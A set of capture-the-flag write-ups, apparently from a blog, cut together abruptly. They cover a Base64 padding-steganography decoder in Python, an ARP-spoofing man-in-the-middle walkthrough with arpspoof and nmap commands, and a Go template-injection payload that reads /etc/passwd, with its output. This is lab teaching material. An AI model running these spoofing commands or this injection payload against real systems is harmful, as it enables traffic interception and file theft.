Let’s break down Base64 principles.\nUnderstanding Base64\nIt takes 3 bytes (24 bits) of data at a time. It splits these bits into 4 groups of 6 bits each. Maps each 6-bit group to one of 64 printable characters: a-z, A-Z, 0-9, +, /. These 3 bytes are now turned into 4 printable ASCII characters. If the number of bytes is completely divisible by 3, leaving no remainder, then the mapping is perfect and no additional processing is needed.\nIn cases where it\u0026rsquo;s not, padding is needed to mark the unused bits.\n= is appended at the end for every unused 2 bits. E.g, QUI= (AB = 2 bytes of input) or QQ==(A = 1 byte of input).\nThe reference table for the conversion can be found here.\nThe decoders ignore those zero\u0026rsquo;d bits and the padding; thus, this gives the oppurtunity to hide information.\nHere\u0026rsquo;s a script that reads the steg64.txt file, processes and decodes every line, and extracts the hidden message.\nimport base64 def base64_to_6bit_values(line): # Converts a base64 encoded string to a string of 6-bit binary values. base64_chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; char_to_6bit = {char: f\u0026#34;{index:06b}\u0026#34; for index, char in enumerate(base64_chars)} binary_string = \u0026#34;\u0026#34; for char in line.strip(): if char in char_to_6bit: binary_string += char_to_6bit[char] return binary_string def extract_unused_bits(line): # Extracts unused bits from the base64 encoded line. # Base64 encodes data in 6-bit chunks, and padding characters \u0026#39;=\u0026#39; are used to # mark unused bits. padding_count = line.count(\u0026#39;=\u0026#39;) if padding_count == 0: return \u0026#34;\u0026#34; # Calculate unused bits: 2 for one padding \u0026#39;=\u0026#39;, 4 for two \u0026#39;==\u0026#39; unused_bits = padding_count * 2 binary_string = base64_to_6bit_values(line) return binary_string[-unused_bits:] if unused_bits \u0026gt; 0 else \u0026#34;\u0026#34; def decode_steganography(file_path): # Reads the file, extracts unused bits, and converts them to readable text. unused_bits_accumulator = \u0026#34;\u0026#34; temp_msg = \u0026#34;\u0026#34; with open(file_path, \u0026#39;r\u0026#39;) as file: for line in file: b64_line = base64.b64decode(line) b64_line = b64_line.decode(\u0026#39;utf-8\u0026#39;) temp_msg += b64_line unused_bits_accumulator += extract_unused_bits(line) # This is the decoded main message. decoded_msg_set(temp_msg) # Break the binary string into chunks of 8 bits and convert to bytes incrementally byte_array = bytearray() for i in range(0, len(unused_bits_accumulator), 8): byte_chunk = unused_bits_accumulator[i:i + 8] if len(byte_chunk) == 8: # Ignore incomplete byte at the end byte_array.append(int(byte_chunk, 2)) # Convert bytes to readable text return byte_array.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # File path file_path = \u0026#34;steg64.txt\u0026#34; decoded_msg = [\u0026#34;\u0026#34;] def decoded_msg_set(s): decoded_msg[0] = s # Decode the steganographic content try: steganography = decode_steganography(file_path) print(\u0026#34;Decoded message:\u0026#34;) print(decoded_msg[0]) print(\u0026#34;\\n\u0026#34;) print(\u0026#34;Decoded steganography:\u0026#34;) print(steganography) except FileNotFoundError: print(f\u0026#34;The file \u0026#39;{file_path}\u0026#39; was not found.\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) Talk to me We managed to tap the headphones of a member of a prolific cyber actor group.

One of the hosts on that network is sending the flag over HTTPS to another host every ~5 seconds. Can you intercept it? ?\nThis environment is somewhat limited. Look through the tools available to you on the machine. The network you connect to is not shared with other participants.\nConnect with ssh [REDACTED] -p 7000\nNote: When you connect to the remote host, you are given a Docker container. If you connect again, you will connect to a different container.\nTo capture the flag being sent between the hosts, we need to perform ARP spoofing, packet sniffing, and a MITM attack (proxying). Before we proceed, however, let\u0026rsquo;s go over the initial \u0026ldquo;reconnaissance\u0026rdquo; once we are inside the machine.\nObtain the IP and MAC addresses of the machine we are on. 192.168.0.201 and 02:42:0a:00:01:44\nroot@interceptor:/# ip addr 31631: eth0@if31632: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:0a:00:01:44 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.0.201/24 scope global eth0 valid_lft forever preferred_lft forever Once we know this, we can scan the network with nmap to find out the other hosts.\nThe -sn flag tells nmap to perform quick host discovery using ICMP echo requests, without port scanning.\nroot@interceptor:/# nmap -sn 192.168.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 14:26 UTC Nmap scan report for 192.168.0.24 Host is up (0.000025s latency).

Nmap done: 256 IP addresses (3 hosts up) scanned in 1.92 seconds Now we know the IP and MAC addresses of the two other hosts on the network that communicate with each other: 192.168.0.24 and 192.168.0.153.\nThe next step is to determine which host is the client sending the data (the flag) and which is acting as the server. This requires us to find the port with nmap or do packet sniffing with tcpdump after the ARP spoofing.\nThis writeup uses the packet sniffing method.\nWe’ll perform ARP spoofing to intercept network traffic between the client and server.\nARP is a communication protocol that links IP and MAC addresses.\nARP spoofing is an attack that occurs on local networks where devices communicate using frames, which include the source and destination MAC addresses - that is OSI Layer 2.\nThe attack poisons the ARP caches by sending ARP messages to the hosts on the network, pretending to be someone else. Thus, all packets will be sent to the spoofed addresses.\nTo execute this attack, we need arpspoof to spoof the IP addresses of the two other hosts.\narpspoof -i eth0 -t 192.168.0.24 192.168.0.153 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; arpspoof -i eth0 -t 192.168.0.153 192.168.0.24 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; IP forwarding is required so the kernel can send the packets to the original destination.

This allows template injetion.\nIn the beginning of the code, you can see the defined empty struct and then the defined function/method ReadBook() for the above-mentioned empty struct. The function has a parameter filePath, and the file at that location is opened, read, and the content returned.\nReferring to Go\u0026rsquo;s html/template documentation, in order to do the injection we need to use the template syntax - {{ }} and . to access the template\u0026rsquo;s passed argument - ReadBook{} which can read a file.\nLets try books?book={{.ReadBook \u0026ldquo;/etc/passwd\u0026rdquo;}}\nroot:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin ....
